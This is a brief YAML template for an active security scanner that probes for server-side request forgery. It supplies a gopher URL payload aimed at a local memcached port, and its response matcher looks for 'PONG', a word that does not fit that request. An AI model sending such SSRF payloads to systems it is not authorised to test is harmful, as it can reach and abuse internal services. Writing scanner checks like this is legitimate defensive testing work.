id: ssrf4-05
name: 'SSRF scheme gopher via url'
severity: high
type: active
tags:
  - ssrf
  - oob
  - scheme
description: 'Fetches gopher URL via url (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      url:
        - 'gopher://127.0.0.1:11211/_stats'
    matchers:
      - type: word
        part: body
        words:
          - 'PONG'
